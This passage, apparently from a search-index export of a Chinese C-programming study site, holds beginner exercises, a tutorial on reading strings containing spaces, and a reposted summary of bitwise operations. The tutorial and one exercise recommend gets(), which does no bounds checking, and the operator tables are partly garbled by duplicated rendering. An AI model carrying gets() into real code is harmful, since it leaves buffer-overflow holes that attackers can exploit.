EOF)//\u8fd9\u4e2aEOF\u8868\u793a\u7684\u662f\u8f93\u5165\u7ed3\u675f\uff08\u4e0d\u61c2\u7684\u53ef\u4ee5\u53bb\u641c\u4e00\u4e0b\uff09\n    {\n        int a[n][n];\n        memset(a, 0, sizeof(a));//\u521d\u59cb\u5316\u6570\u7ec4 \u5168\u90e8\u586b\u51650\n        int i = 0, j = n / 2;\n        a[i][j] = 1;//\u7b2c\u4e00\u884c\u4e2d\u95f4\u5143\u7d20\u8d4b\u503c\u4e3a1\n        for (int k = 2; k &lt;= n * n; k++)//\u5171n*n\u4e2a\u6570\u90fd\u5faa\u73af\u4e00\u6b21\n        {\n            if (a[(i + n - 1) % n][(j + 1) % n] == 0) //\u5b83\u7684\u4e0a\u4e00\u884c\uff0c\u4e0b\u4e00\u5217\u8fd8\u672a\u88ab\u8d4b\u503c\uff08\u4ecd\u662f\u521d\u503c0\u65f6\uff09\u5c31\u628a\u4ed6\u8d4b\u503c\u4e3ak\n            {\n\n                i = (i + n - 1) % n;//\u89c4\u5f8b\u6bd4\u8f83\u96be\u627e \u770b\u7684\u9898\u76ee\u4f8b\u5b50\u627e\u7684\n                j = (j + 1) % n;\n                a[i][j] = k;\n            }\n            else if (a[(i + n - 1) % n][(j + 1) % n] != 0 || (i == 0 &amp;&amp; j == n - 1))\n            {\n                //\u5982\u679c\u4f4d\u7f6e\u5df2\u7ecf\u6709\u6570\uff0c\n                //\u6216\u4e0a\u4e00\u4e2a\u6570\u5728\u7b2c\u4e00\u884c\u7b2cN\u5217\uff0c\n                //\u5219\u4e0b\u4e00\u4e2a\u6570\uff0c\u653e\u5728\u4e0a\u4e00\u4e2a\u6570\u7684\u6b63\u4e0b\u65b9\u3002 \n                i = (i + 1) % n;\n                a[i][j] = k;\n            }\n        }\n        for (i = 0; i &lt; n; i++) //\u6253\u5370\u8f93\u51fa\u4e8c\u7ef4\u77e9\u9635\n        {\n            for (j = 0; j &lt; n - 1; j++)\n            {\n                printf(\"%d\\t\", a[i][j]);\n            }\n            printf(\"%d\\n\", a[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}\n//memset\u7b80\u4ecb\\nmemset\u662f\u4e00\u4e2a\u521d\u59cb\u5316\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5c06\u67d0\u4e00\u5757\u5185\u5b58\u4e2d\u7684\u5168\u90e8\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u503c\u3002\n//nvoid *memset(void *s, int c, size_t n); s\u6307\u5411\u8981\u586b\u5145\u7684\u5185\u5b58\u5757\u3002c\u662f\u8981\u88ab\u8bbe\u7f6e\u7684\u503c\u3002n\u662f\u8981\u88ab\u8bbe\u7f6e\u8be5\u503c\u7684\u5b57\u7b26\u6570\u3002\u8fd4\u56de\u7c7b\u578b\u662f\u4e00\u4e2a\u6307\u5411\u5b58\u50a8\u533as\u7684\u6307\u9488\u3002\n//\u9700\u8981\u8bf4\u660e\u7684\u51e0\u4e2a\u5730\u65b9 1.\u4e0d\u80fd\u4efb\u610f\u8d4b\u503c 2.\u6ce8\u610f\u6570\u636e\u7c7b\u578b\u3002\n//\u8fd9\u91cc\u662f\u5c5e\u5b9e\u4e0d\u60f3\u7528\u6570\u7ec4\u89e3\u51b3 \u6240\u4ee5\u4f7f\u7528\u4e86\u6307\u9488 \u5982\u679c\u6709\u66f4\u4f18\u89e3 \u6b22\u8fce\u8054\u7cfb\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#84","title":"84","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    int arr[20] = {0};\n    int wang = 0;\n    int zhao = 0;\n    int li = 0;\n\n    for (int i = 0; i &lt; 20; i++)\n    {\n        scanf(\"%d\", &amp;arr[i]);\n        if (arr[i] == 1)\n        {\n            wang++;\n        }\n        else if (arr[i] == 2)\n        {\n            zhao++;\n        }\n        else if (arr[i] == 3)\n        {\n            li++;\n        }\n    }\n    printf(\"\u738b\u4e00\u5f97\u7968:%d\\n\", wang);\n    printf(\"\u8d75\u4e8c\u5f97\u7968:%d\\n\", zhao);\n    printf(\"\u674e\u4e09\u5f97\u7968:%d\\n\", li);\n    if (wang &gt; zhao &amp;&amp; wang &gt; li)\n    {\n        printf(\"\u73ed\u957f\u662f\uff1a\u738b\u4e00\");\n    }\n    else if (zhao &gt; wang &amp;&amp; zhao &gt; li)\n    {\n        printf(\"\u73ed\u957f\u662f\uff1a\u8d75\u4e8c\");\n    }\n    else if (li &gt; zhao &amp;&amp; wang &lt; li)\n    {\n        printf(\"\u73ed\u957f\u662f\uff1a\u674e\u4e09\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#85","title":"85","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint max_number(int numbers[10])\n{\n    int tmp = 0;\n    for (int i = 0; i &lt; 10; i++)\n    {\n\n        if (numbers[i] &gt; tmp)\n        {\n            tmp = numbers[i];\n        }\n    }\n\n    return tmp;\n}\n\nint main() {\n\n    int max_num, numbers[10] = { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 };\n    max_num = max_number(numbers);\n    printf(\"%d\", max_num);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%95%B0%E7%BB%84/#86","title":"86","text":"C<pre><code>//\u5173\u4e8e\u6b64\u9898\u7684\u8bf4\u660e\uff1a\u4f7f\u7528\u7684gets\u51fd\u6570\u5e76\u4e0d\u9002\u7528\u4e8e\u6240\u6709\u7f16\u8bd1\u73af\u5883\uff0c\u6240\u4ee5\u4f7f\u7528\u65f6\u8981\u6ce8\u610f\u3002\n//\u6ce8\u610f\u5f15\u7528\u5934\u6587\u4ef6&lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include&lt;string.h&gt;\n\nint main() {\n    char string_name[101];\n\n    int letter = 0, space = 0, number = 0, other = 0;\n    //scanf(\"%s\",&amp;string);\n    //string_name[101]={string};\n    gets(string_name);\n\n    int num = strlen(string_name);\n    for (int i = 0; i &lt; num; i++)\n    {\n        if (string_name[i] &gt;= 'A' &amp;&amp; string_name[i] &lt;= 'Z')\n        {\n            letter++;\n        }\n        else if (string_name[i] &gt;= 'a' &amp;&amp; string_name[i] &lt;= 'z')\n        {\n            letter++;\n        }\n        else if (string_name[i] &gt;= '0' &amp;&amp; string_name[i] &lt;= '9')\n        {\n            number++;\n        }\n        else if (string_name[i] == ' ')\n        {\n            space++;\n        }\n        else\n        {\n            other++;\n        }\n    }\n    printf(\"letter:%d\\nspace:%d\\nnumber:%d\\nother:%d\\n\", letter, space, number, other);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Scanf%20%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%81%87%E5%88%B0%E7%A9%BA%E6%A0%BC/","title":"\u4f7f\u7528 scanf \u65f6\u5bf9\u7a7a\u683c\u5904\u7406\uff1f","text":"<ul> <li>\u95ee\u9898\u63cf\u8ff0</li> <li> <ul> <li>\u89e3\u51b3\u529e\u6cd5</li> </ul> </li> <li>\u603b\u7ed3</li> </ul>"},{"location":"DEC/C/Scanf%20%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%81%87%E5%88%B0%E7%A9%BA%E6%A0%BC/#_1","title":"\u95ee\u9898\u63cf\u8ff0","text":"<p>scanf \u8f93\u5165\u5b57\u7b26\u4e32\uff08\u542b\u6709\u7a7a\u683c\u7684\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1a\u201cI love you!\u201d\uff09\u65f6\uff0c\u603b\u662f\u5728\u7a7a\u683c\u5904\u505c\u6b62\u626b\u63cf\u3002\u6211\u4eec\u7528 scanf(\"%s\",str); \u8f93\u5165 \u201cI love you!\u201d \u5b57\u7b26\u4e32\u540e\uff0cstr \u8f93\u51fa\u5374\u53ea\u6709 \u201cI\u201d \uff0c\u8fd9\u5e76\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684\u3002\u8fd9\u662f\u56e0\u4e3a scanf \u626b\u63cf\u5230 \u201cI\u201d \u540e\u9762\u7684\u7a7a\u683c\uff0c\u5c31\u8ba4\u4e3a\u5bf9 str \u7684\u626b\u63cf\u7ed3\u675f\uff08\u5373\u7a7a\u683c\u6ca1\u6709\u88ab\u626b\u63cf\uff09\uff0c\u5e76\u820d\u5f03\u540e\u9762\u7684 \"love you!\"\uff0c\u53ea\u5f97\u5230\u4e86 \u201cI\u201d \u3002</p>"},{"location":"DEC/C/Scanf%20%E8%BE%93%E5%85%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%81%87%E5%88%B0%E7%A9%BA%E6%A0%BC/#_2","title":"\u89e3\u51b3\u529e\u6cd5","text":"<p>\u5728\u8fd9\u91cc\u7ed9\u51fa\u4e86\u4e24\u79cd\u89e3\u51b3\u529e\u6cd5\uff0c\u53ef\u4ee5\u8ba9\u7a7a\u683c\u4e5f\u88ab\u626b\u63cf\u5230 str \u91cc\u3002</p> <ol> <li>gets() \u51fd\u6570 \uff0c\u7528 gets() \u66ff\u4ee3 scanf()\uff1b     gets \u53ef\u4ee5\u65e0\u9650\u8bfb\u53d6\u5b57\u7b26\u4e32\uff0c\u4e0d\u4f1a\u5224\u65ad\u4e0a\u9650\uff0c\u4ee5\u56de\u8f66\u7ed3\u675f\u8bfb\u53d6\u3002\u5176\u7528\u6cd5\u4e3a gets(s)\uff0c\u5176\u4e2d s \u4e3a\u5b57\u7b26\u4e32\u53d8\u91cf\uff08\u5b57\u7b26\u4e32\u6570\u7ec4\u540d\u6216\u5b57\u7b26\u4e32\u6307\u9488\uff09\u3002\u7b80\u5355\u7684\u7406\u89e3\u5c31\u662f\u8bfb\u5165\u4e00\u4e32\u5b57\u7b26\uff08\u9047\u5230\u56de\u8f66\u7ed3\u675f\uff09\uff0c\u5b58\u5230 s \u4e2d\u3002</li> </ol> C<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n   char str[50];\n   gets(str);\n   printf(\"%s\\n\",str);\n   return 0;\n}\n</code></pre> <ol> <li>scanf(\"%[^\\n]\",str) \uff0c\u9047\u5230 \"\\n\" \u7ed3\u675f     '^'\u542b\u6709\u975e\u7684\u610f\u601d     \u201c%[^\\n]\u201c\u5373\u9047\u5230 \\ n \u7ed3\u675f\u3002     \u5982\u679c\u4f7f\u7528\u201d%[^v]\u201d\uff0c\u90a3\u6211\u4eec\u8f93\u5165 \u201cI love you!\u201d \uff0c\u8f93\u51fa\u7684\u5c31\u662f \u201cI lo\u201d \uff0c\u73b0\u5728\u80fd\u61c2\u8fd9\u4e2a\u975e\u7684\u610f\u601d\u4e86\u5427\u2026</li> </ol> C<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n    char str[50];\n    scanf(\"%[^\\n]\",str);//\"%[^v]\"\n    printf(\"%s\\n\",str);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/","title":"\u4f4d\u8fd0\u7b97\u603b\u7ed3\uff08\u8f6c\u8f7d\uff09","text":""},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#_2","title":"\uff08\u8f6c\u8f7d\u81ea \u4f4d\u8fd0\u7b97\u5168\u9762\u603b\u7ed3\uff0c\u5173\u4e8e\u4f4d\u8fd0\u7b97\u770b\u8fd9\u7bc7\u5c31\u591f\u4e86\uff09","text":""},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#_3","title":"\u6587\u7ae0\u76ee\u5f55","text":"<ul> <li>1 \u4f4d\u8fd0\u7b97\u6982\u8ff0</li> <li>2 \u4f4d\u8fd0\u7b97\u7684\u6027\u8d28</li> <li> <ul> <li>2.1 \u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7</li> <li>2.2 \u4f4d\u8fd0\u7b97\u7b26\u7684\u8fd0\u7b97\u5f8b</li> </ul> </li> <li>3 \u4f4d\u8fd0\u7b97\u9ad8\u7ea7\u64cd\u4f5c</li> <li>4 \u8d1f\u6570\u7684\u4f4d\u8fd0\u7b97</li> <li>5 \u4f4d\u8fd0\u7b97\u7684\u4e00\u4e9b\u5e94\u7528</li> <li>6 \u4f4d\u8fd0\u7b97\u4f8b\u9898</li> <li> <ul> <li>6.1 \u66f4\u65b0\u4e8c\u8fdb\u5236\u4f4d</li> <li>6.2 A+B \u95ee\u9898</li> <li>6.3 O(1) \u65f6\u95f4\u68c0\u6d4b 2 \u7684\u5e42\u6b21</li> </ul> </li> </ul>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#1","title":"1 \u4f4d\u8fd0\u7b97\u6982\u8ff0","text":"<p>\u6211\u4eec\u77e5\u9053\uff0c\u8ba1\u7b97\u673a\u4e2d\u7684\u6570\u5728\u5185\u5b58\u4e2d\u90fd\u662f\u4ee5\u4e8c\u8fdb\u5236\u5f62\u5f0f\u8fdb\u884c\u5b58\u50a8\u7684 \uff0c\u800c\u4f4d\u8fd0\u7b97\u5c31\u662f\u76f4\u63a5\u5bf9\u6574\u6570\u5728\u5185\u5b58\u4e2d\u7684\u4e8c\u8fdb\u5236\u4f4d\u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5176\u6267\u884c\u6548\u7387\u975e\u5e38\u9ad8\uff0c\u5728\u7a0b\u5e8f\u4e2d\u5c3d\u91cf\u4f7f\u7528\u4f4d\u8fd0\u7b97\u8fdb\u884c\u64cd\u4f5c\uff0c\u8fd9\u4f1a\u5927\u5927\u63d0\u9ad8\u7a0b\u5e8f\u7684\u6027\u80fd\u3002  </p> <p>\u90a3\u4e48\uff0c\u6d89\u53ca\u4f4d\u8fd0\u7b97\u7684\u8fd0\u7b97\u7b26\u5982\u4e0b\u8868\u6240\u793a\uff1a</p> \u7b26\u53f7\u63cf\u8ff0\u8fd0\u7b97\u89c4\u5219\u5b9e\u4f8b\uff08\u4ee5\u56db\u4f4d\u4e8c\u8fdb\u5236\u6570\u4e3a\u4f8b\uff09&amp;\u4e0e\u4e24\u4e2a\u4f4d\u90fd\u4e3a 1 \u65f6\uff0c\u7ed3\u679c\u624d\u4e3a 1\u30020001 &amp; 0001 = 1 , 0001 &amp; 0000 = 0 , 0000 &amp; 0000 = 0000 0001\\&amp;0001=1,0001\\&amp;0000=0,0000\\&amp;0000=0000 0001&amp;0001=1,0001&amp;0000=0,0000&amp;0000=0000|\u6216\u4e24\u4e2a\u4f4d\u90fd\u4e3a 0 \u65f6\uff0c\u7ed3\u679c\u624d\u4e3a 0\u30020001 \u2223 0001 = 0001 , 0001 \u2223 0000 = 0001 , 0000 \u2223 0000 = 0000 0001|0001=0001,0001|0000=0001,0000|0000=0000 0001\u22230001=0001,0001\u22230000=0001,0000\u22230000=0000^\u5f02\u6216\u4e24\u4e2a\u4f4d\u76f8\u540c\u4e3a 0\uff0c\u76f8\u5f02\u4e3a 1\u30020001 \u2227 0001 = 0000 , 0001 \u2227 0000 = 1 , 0000 \u2227 0000 = 0 0001 \\wedge0001=0000,0001\\wedge0000=1,0000\\wedge 0000=0 0001\u22270001=0000,0001\u22270000=1,0000\u22270000=0~\u53d6\u53cd0 \u53d8 1\uff0c1 \u53d8 0\u3002\u223c 0 = 1 , \u223c 1 = 0 \\sim0=1,\\sim 1 = 0 \u223c0=1,\u223c1=0&lt;&lt;\u5de6\u79fb\u5404\u4e8c\u8fdb\u4f4d\u5168\u90e8\u5de6\u79fb\u82e5\u5e72\u4f4d\uff0c\u9ad8\u4f4d\u4e22\u5f03\uff0c\u4f4e\u4f4d\u8865 0\u30020001 &lt; &lt; k = 0100 \uff0c k = 2 0001&lt;&lt;k=0100\uff0ck=2 0001&lt;&lt;k=0100\uff0ck=2\uff0c k k k \u662f\u5de6\u79fb\u7684\u4f4d\u6570\uff0c\u8fd9\u91cc k = 2 k=2 k=2&gt;&gt;\u53f3\u79fb\u5404\u4e8c\u8fdb\u4f4d\u5168\u90e8\u53f3\u79fb\u82e5\u5e72\u4f4d\uff0c\u5bf9\u65e0\u7b26\u53f7\u6570\uff0c\u9ad8\u4f4d\u8865 0\uff0c\u6709\u7b26\u53f7\u6570\uff0c\u53f3\u79fb\u8865 1 1 1\u30020100 &gt; &gt; k = 0001 \uff0c k = 2 0100&gt;&gt;k=0001\uff0ck=2 0100&gt;&gt;k=0001\uff0ck=2\uff0c k k k \u662f\u53f3\u79fb\u7684\u4f4d\u6570\uff0c\u8fd9\u91cc k = 2 k=2 k=2 <p>\u770b\u5b8c\uff0c\u4f60\u53ef\u80fd\u4f1a\u89c9\u5f97\u633a\u7b80\u5355\u7684\uff0c\u4f46\u4f4d\u8fd0\u7b97\u7684\u96be\u70b9\u5e76\u4e0d\u5728\u8fd9\uff0c\u800c\u5728\u4e8e\u5176\u6027\u8d28\u3001\u9ad8\u7ea7\u64cd\u4f5c\u548c\u5b83\u7684\u5e94\u7528\u3002</p>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#2","title":"2 \u4f4d\u8fd0\u7b97\u7684\u6027\u8d28","text":""},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#21","title":"2.1 \u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7","text":"<p>\u4f18\u5148\u7ea7\u9700\u8981\u5f04\u6e05\u695a\uff0c\u5982\u679c\u4e0d\u592a\u6e05\u695a\u53ef\u4ee5\u52a0\u5c0f\u62ec\u53f7\u786e\u4fdd\u662f\u60f3\u8981\u7684\u8fd0\u7b97\u987a\u5e8f\uff0c\u8fd9\u91cc\u53ea\u662f\u76f8\u5bf9\u4f18\u5148\u7ea7\uff0c\u5373\u53ea\u662f\u548c\u4e00\u4e9b\u5e38\u7528\u7684\u7b97\u672f\u8fd0\u7b97\u7b26\u505a\u6bd4\u8f83\u3002</p> \u4f18\u5148\u7ea7\u8fd0\u7b97\u7b26\u7ed3\u5408\u65b9\u54111\u2212 \uff08\u7b26\u53f7\u8fd0\u7b97\u7b26\uff09 , \u223c \uff08\u53d6\u53cd\u8fd0\u7b97\u7b26\uff09\uff0c + + \uff08\u81ea\u589e\uff09\uff0c \u2212 \u2212 \uff08\u81ea\u51cf\uff09 -\uff08\u7b26\u53f7\u8fd0\u7b97\u7b26\uff09,\\sim\uff08\u53d6\u53cd\u8fd0\u7b97\u7b26\uff09\uff0c ++\uff08\u81ea\u589e\uff09\uff0c--\uff08\u81ea\u51cf\uff09 \u2212\uff08\u7b26\u53f7\u8fd0\u7b97\u7b26\uff09,\u223c\uff08\u53d6\u53cd\u8fd0\u7b97\u7b26\uff09\uff0c++\uff08\u81ea\u589e\uff09\uff0c\u2212\u2212\uff08\u81ea\u51cf\uff09\u4ece\u53f3\u5230\u5de62\u2217 \uff08\u4e58\uff09 , / \uff08\u9664\uff09 , % \uff08\u53d6\u4f59\uff09 *\uff08\u4e58\uff09,/\uff08\u9664\uff09,\\%\uff08\u53d6\u4f59\uff09 \u2217\uff08\u4e58\uff09,/\uff08\u9664\uff09,%\uff08\u53d6\u4f59\uff09\u4ece\u5de6\u5230\u53f33+ \uff08\u52a0\uff09 , \u2212 \uff08\u51cf\uff09 +\uff08\u52a0\uff09,-\uff08\u51cf\uff09 +\uff08\u52a0\uff09,\u2212\uff08\u51cf\uff09\u4ece\u5de6\u5230\u53f34&lt; &lt;\uff08\u5de6\u79fb\uff09\uff0c&gt; &gt; \uff08\u53f3\u79fb\uff09 &lt;&lt;\uff08\u5de6\u79fb\uff09\uff0c&gt;&gt;\uff08\u53f3\u79fb\uff09 &lt;&lt;\uff08\u5de6\u79fb\uff09\uff0c&gt;&gt;\uff08\u53f3\u79fb\uff09\u4ece\u5de6\u5230\u53f35&gt; \uff08\u5927\u4e8e\uff09 , &lt; (\u5c0f\u4e8e) , &gt; = ( \u5927\u4e8e\u7b49\u4e8e ) , &lt; = ( \u5c0f\u4e8e\u7b49\u4e8e ) &gt;\uff08\u5927\u4e8e\uff09,&lt;(\u5c0f\u4e8e),&gt;=(\u5927\u4e8e\u7b49\u4e8e),&lt;=(\u5c0f\u4e8e\u7b49\u4e8e) &gt;\uff08\u5927\u4e8e\uff09,&lt;(\u5c0f\u4e8e),&gt;=(\u5927\u4e8e\u7b49\u4e8e),&lt;=(\u5c0f\u4e8e\u7b49\u4e8e)\u4ece\u5de6\u5230\u53f36= = (\u7b49\u4e8e) , ! = \uff08\u4e0d\u7b49\u4e8e\uff09 ==(\u7b49\u4e8e),!=\uff08\u4e0d\u7b49\u4e8e\uff09 ==(\u7b49\u4e8e),!=\uff08\u4e0d\u7b49\u4e8e\uff09\u4ece\u5de6\u5230\u53f37&amp; \uff08\u6309\u4f4d\u4e0e\uff09 \\&amp;\uff08\u6309\u4f4d\u4e0e\uff09 &amp;\uff08\u6309\u4f4d\u4e0e\uff09\u4ece\u5de6\u5230\u53f38\u2227 (\u6309\u4f4d\u5f02\u6216) \\wedge (\u6309\u4f4d\u5f02\u6216) \u2227(\u6309\u4f4d\u5f02\u6216)\u4ece\u5de6\u5230\u53f39\u2223 (\u6309\u4f4d\u6216) |(\u6309\u4f4d\u6216) \u2223(\u6309\u4f4d\u6216)\u4ece\u5de6\u5230\u53f3"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#22","title":"2.2 \u4f4d\u8fd0\u7b97\u7b26\u7684\u8fd0\u7b97\u5f8b","text":"\u516c\u5f0f\u540d\u79f0\u8fd0\u7b97\u89c4\u5219\u4ea4\u6362\u5f8bA &amp; B = B &amp; A , A \u2227 B = B \u2227 A A\\&amp;B=B\\&amp;A ,A\\wedge B=B\\wedge A A&amp;B=B&amp;A,A\u2227B=B\u2227A\u7ed3\u5408\u5f8b\uff08\u6ce8\u610f\u7ed3\u5408\u5f8b\u53ea\u80fd\u5728\u540c\u7b26\u53f7\u4e0b\u8fdb\u884c\uff09( A &amp; B ) &amp; C = A &amp; ( B &amp; C ) (A\\&amp;B)\\&amp;C=A\\&amp;(B\\&amp;C) (A&amp;B)&amp;C=A&amp;(B&amp;C)\u7b49\u5e42\u5f8bA &amp; A = A \uff0c A \u2223 A = A A\\&amp;A=A\uff0cA|A=A A&amp;A=A\uff0cA\u2223A=A\u96f6\u5f8bA &amp; 0 = 0 A\\&amp;0=0 A&amp;0=0\u4e92\u8865\u5f8b\uff08\u6ce8\u610f\uff0c\u8fd9\u4e0d\u540c\u4e8e\u903b\u8f91\u8fd0\u7b97\uff09A &amp; \u223c A = 0 , A \u2223 \u223c A = \u2212 1 A\\&amp;\\sim A=0,A|\\sim A=-1 A&amp;\u223cA=0,A\u2223\u223cA=\u22121\u540c\u4e00\u5f8bA \u2223 0 = A \uff0c A \u2227 0 = A A|0=A\uff0cA\\wedge 0 =A A\u22230=A\uff0cA\u22270=A <p>\u4ee5\u4e0a\u4ec5\u4e3a\u5df2\u8bc1\u660e\u7684\u8fd0\u7b97\u5f8b\uff08\u53ef\u80fd\u5b58\u5728\u9057\u6f0f\uff09\uff0c\u5176\u4f59\u7684\u535a\u4e3b\u5747\u8ba4\u4e3a\u662f\u4e0d\u7b26\u5408\u4e0d\u6210\u7acb\u7684\uff0c\u6ce8\u610f\uff1a\u5343\u4e07\u4e0d\u8981\u5c06\u903b\u8f91\u8fd0\u7b97\u7684\u8fd0\u7b97\u5f8b\u6216\u8005\u5176\u4ed6\u7684\u8fd0\u7b97\u5f8b\u4e0e\u8fd9\u6df7\u4e3a\u4e00\u8c08\u3002</p>"},{"location":"DEC/C/%E4%BD%8D%E8%BF%90%E7%AE%97%E6%80%BB%E7%BB%93/#3","title":"3 \u4f4d\u8fd0\u7b97\u9ad8\u7ea7\u64cd\u4f5c","text":"<p>\u5982\u4e0b\u8868\uff0c\u8bf7\u8bfb\u8005\u8ba4\u771f\u9605\u8bfb\u7406\u89e3\uff0c\u5728\u9605\u8bfb\u7684\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u5bf9\u793a\u4f8b\u8fdb\u884c\u8fd0\u7b97\u3002</p> \u529f\u80fd\u793a\u4f8b\u4f4d\u8fd0\u7b97\u53bb\u6389\u6700\u540e\u4e00\u4f4d0100 \u2212 &gt; 0010 0100-&gt;0010 0100\u2212&gt;0010x &gt; &gt; 1 x&gt;&gt;1 x&gt;&gt;1\u5728\u6700\u540e\u52a0\u4e00\u4e2a 0 0 00100 \u2212 &gt; 1000 0100-&gt;1000 0100\u2212&gt;1000x &lt; &lt; 1 x&lt;&lt;1 x&lt;&lt;1\u5728\u6700\u540e\u52a0\u4e00\u4e2a 10100 \u2212 &gt; 1001 0100-&gt;1001 0100\u2212&gt;1001( x &lt; &lt;1) + 1 (x&lt;&lt;1)+1 (x&lt;&lt;1)+1\u5c06\u6700\u540e\u4e00\u4f4d\u53d8\u4e3a 1 1 10100 \u2212 &gt; 0101 0100-&gt;0101 0100\u2212&gt;0101x \u2223 1 x|1 x\u22231\u5c06\u6700\u540e\u4e00\u4f4d\u53d8\u4e3a 0 0 00101 \u2212 &gt; 0100 0101-&gt;0100 0101\u2212&gt;0100\uff0c\u8fd9\u91cc\u5b9e\u9645\u4e0a\u5c31\u662f\u5148\u786e\u4fdd\u6700\u4f4e\u4f4d\u53d8\u4e3a 1 1 1\uff0c\u518d\u51cf\u53bb 1 1 1\u3002( x \u2223 1 ) \u2212 1 (x|1)-1 (x\u22231)\u22121\u6700\u540e\u4e00\u4f4d\u53d6\u53cd0100 \u2212 &gt; 0101 0100-&gt;0101 0100\u2212&gt;0101 \uff0c\u5229\u7528\u5f02\u6216\u6027\u8d28\uff0c\u5176\u4e2d\u9664\u6700\u540e\u4e00\u4f4d\u5176\u4f59\u4e0d\u53d8\u3002x \u2227 1 x\\wedge1 x\u22271\u628a\u53f3\u6570\u7684\u7b2c k k k \u4f4d\u53d8\u4e3a 1 1 10001 \u2212 &gt; 1001 , k = 4 0001-&gt;1001,k=4 0001\u2212&gt;1001,k=4x \u2223 ( 1 &lt; &lt; ( k \u2212 1 ) ) x|(1&lt;&lt;(k-1)) x\u2223(1&lt;&lt;(k\u22121))\u628a\u53f3\u6570\u7684\u7b2c k k k \u4f4d\u53d8\u4e3a 0 0 01001 \u2212 &gt; 0001 , k = 4 1001-&gt;0001,k=4 1001\u2212&gt;0001,k=4\uff0c\u8fd9\u4e2a\u64cd\u4f5c\u5b9e\u9645\u4e0a\u5c31\u662f\u5148\u5f97\u5230\u4e86 1000 1000 1000\uff0c\u7136\u540e\u53d6\u53cd\u5f97\u5230 0111 0111 0111\uff0c\u6700\u540e\u5229\u7528\u6309\u4f4d\u4e0e\u7684\u6027\u8d28\u5176\u4f59\u4f4d\u4e0d\u53d8\uff0c\u6700\u9ad8\u4f4d\u4e3a 0 0 0x &amp; ( \u223c ( 1 &lt; &lt; ( k \u2212 1 ) ) ) x\\&amp;(\\sim(1&lt;&lt;(k-1))) x&amp;(\u223c(1&lt;&lt;(k\u22121)))\u628a\u53f3\u6570\u7684\u7b2c k k k \u4f4d\u53d6\u53cd1000 \u2212 &gt; 0000 , k = 4 1000-&gt;0000,k=4 1000\u2212&gt;0000,k=4\uff0c\u5229\u7528\u5f02\u6216\u6027\u8d28x \u2227 ( 1 &lt; &lt; ( k \u2212 1 ) ) x\\wedge (1&lt;&lt;(k-1)) x\u2227(1&lt;&lt;(k\u22121)) <p>\u7531\u4e8e\u8868\u957f\u9650\u5236\uff0c\u8fd9\u91cc\u63a5\u4e0b\u8868\u7ee7\u7eed\uff1a</p> \u529f\u80fd\u793a\u4f8b\u4f4d\u8fd0\u7b97\u53d6\u672b k k k \u4f4d1011 \u2212 &gt; 0011 , k = 2 1011-&gt;0011,k=2 1011\u2212&gt;0011,k=2x &amp; ( ( 1 &lt; &lt;k) \u2212 1 ) x\\&amp;((1&lt;&lt;k)-1) x&amp;((1&lt;&lt;k)\u22121)\u53d6\u53f3\u6570\u7684\u7b2c k k k \u4f4d1011 \u2212 &gt; 0001 , k = 4 1011-&gt;0001,k=4 1011\u2212&gt;0001,k=4\uff0c\u53f3\u79fb k \u2212 1 k-1 k\u22121 \u4f4d\u5219\u662f\u53bb\u6389\u4e86\u6700\u540e\u7684 k \u2212 1 k-1 k\u22121 \u4f4d\uff0c\u6211\u4eec\u5229\u7528\u6309\u4f4d\u4e0e\u5373\u53ef\u5c06\u5176\u63d0\u53d6\u51fa\u6765x &gt; &gt; ( k \u2212 1 ) &amp; 1 x&gt;&gt;(k-1)\\&amp;1 x&gt;&gt;(k\u22121)&amp;1\u628a\u672b k k k \u4f4d\u5168\u53d8\u4e3a 1 1 11000 \u2212 &gt; 1111 , k = 3 1000-&gt;1111,k=3 1000\u2212&gt;1111,k=3x \u2223 ( ( 1 &lt; &lt;k) \u2212 1 ) x|((1&lt;&lt;k)-1) x\u2223((1&lt;&lt;k)\u22121)\u628a\u672b k k k \u4f4d\u53d6\u53cd0101 \u2212 &gt; 1010 , k = 4 0101-&gt;1010,k=4 0101\u2212&gt;1010,k=4x \u2227 ( ( 1 &lt; &lt;k) \u2212 1 ) x\\wedge ((1&lt;&lt;k)-1) x\u2227((1&lt;&lt;k)\u22121)\u628a\u53f3\u8fb9\u8fde\u7eed\u7684 1 1 1 \u53d8\u4e3a 0 0 00111 \u2212 &gt; 0000 0111-&gt;0000 0111\u2212&gt;0000 \uff0c\u6ce8\u610f\u662f\u53f3\u8d77\u8fde\u7eed\u7684 1 1 1x &amp; ( x + 1 ) x\\&amp;(x+1) 